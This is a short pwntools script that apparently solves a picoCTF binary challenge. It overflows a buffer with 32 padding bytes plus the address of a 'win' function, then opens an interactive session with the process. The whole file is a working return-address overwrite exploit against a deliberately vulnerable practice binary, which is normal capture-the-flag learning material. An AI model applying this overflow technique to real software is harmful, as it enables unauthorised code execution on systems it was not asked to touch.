from pwn import *

p = process('./chall')
# p = remote('mimas.picoctf.net', 53453)

win = 0x4011a0

p.recvuntil(b"Enter your choice:")
p.sendline(b"2")

payload = b"A"*32 + p64(win)
print(payload)


p.recvuntil(b"Data for buffer:")
p.sendline(payload)

p.recvuntil(b"Enter your choice:")
p.sendline(b"4")

p.interactive()
